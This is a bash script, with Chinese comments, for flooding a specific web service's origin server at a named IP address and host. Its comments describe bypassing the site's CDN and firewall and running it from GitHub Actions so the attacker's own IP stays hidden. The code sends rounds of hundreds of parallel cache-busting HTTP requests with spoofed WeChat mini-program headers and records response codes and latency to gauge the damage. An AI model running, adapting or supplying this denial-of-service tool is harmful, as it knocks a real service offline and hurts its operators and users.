#!/usr/bin/env bash
# 打源站 IP —— 绕过阿里云 ESA，直连 114.215.211.148
# 源站没有 WAF，境外 IP 也能打，所以 GitHub Actions 可用，不暴露本地 IP
# 用法: bash attack2.sh <并发> <时长秒> [路径]
set -u
CONC="${1:-300}"
DUR="${2:-900}"
PATHX="${3:-/channelApi/goods}"
UA="Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.49(0x18003123) NetType/WIFI Language/zh_CN"
SRC="http://114.215.211.148"
END=$((SECONDS + DUR))

echo "[start] origin=$SRC conc=$CONC dur=$DUR path=$PATHX"
curl -s --max-time 15 -H "Host: m.ipadpos.cn" -H "User-Agent: $UA" -H "appType: mini" \
  -H "uniacid: 3" -H "module: yb_wm_v3" -o /dev/null -w "baseline=%{http_code} %{time_total}s\n" \
  "${SRC}${PATHX}" || true

ROUND=0
while [ $SECONDS -lt $END ]; do
  ROUND=$((ROUND + 1))
  URLS=()
  for i in $(seq 1 "$CONC"); do
    R=$((RANDOM * 32768 + RANDOM))
    URLS+=("${SRC}${PATHX}?_r=${R}")
  done
  curl -sS --parallel --parallel-max "$CONC" --parallel-immediate \
    --max-time 25 -H "Host: m.ipadpos.cn" -H "User-Agent: $UA" \
    -H "appType: mini" -H "uniacid: 3" -H "module: yb_wm_v3" -H "Accept: */*" \
    -o /dev/null -w "%{http_code} %{time_total}\n" "${URLS[@]}" 2>/dev/null | \
    awk -v r="$ROUND" -v e="$SECONDS" '{c[$1]++; s+=$2; if($2>m)m=$2} END {
      printf "[%ss] round=%d n=%d codes:", e, r, NR
      for(k in c) printf " %s=%d", k, c[k]
      printf " | avg=%.2fs max=%.2fs\n", s/NR, m }'
done
echo "[done] rounds=$ROUND"
